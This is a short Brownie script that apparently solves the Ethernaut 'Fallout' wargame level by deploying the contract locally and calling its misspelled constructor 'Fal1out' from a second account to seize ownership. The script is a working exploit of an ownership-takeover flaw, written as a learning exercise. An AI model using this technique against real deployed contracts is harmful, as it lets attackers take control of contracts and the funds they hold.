from brownie import Fallout, accounts

def main():
    owner = accounts[0]
    hacker = accounts[1]
    fallout = Fallout.deploy({'from': owner})
    print("Hacker is owner: ", fallout.owner() == hacker)
    # There is a typo in contract ;)
    fallout.Fal1out({'from': hacker, 'amount': '0.1 ether'})
    print("Hacker is owner: ", fallout.owner() == hacker)
